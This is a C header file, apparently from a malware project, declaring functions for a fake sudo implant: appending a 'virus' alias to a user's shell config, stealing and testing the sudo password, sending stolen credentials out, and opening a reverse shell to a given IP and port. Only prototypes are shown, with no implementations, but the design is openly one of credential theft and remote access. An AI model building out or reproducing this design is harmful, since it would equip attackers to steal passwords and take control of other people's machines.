#ifndef PSEUDO_H
#define PSEUDO_H

#define P_SUDO 0
#define P_IMPLANT 1
#define P_ROOT 2

int append_virus(char * home_dir, char * config_file, char * alias);
int alias_virus();
int steal_password(char * passwd, char * username);

int runSudo(char * passwd, char ** argary, int mask_output);
int testSudoPassword(char * passwd);

char ** make_execvp_args(int argc, char ** argv);
void free_execvp_ray(char ** cmd_ray);
int get_virus_name(char * escaped_path);
void send_stolen_data(char *username, char *password);

int reverse_shell(int port, char*ip);
#endif
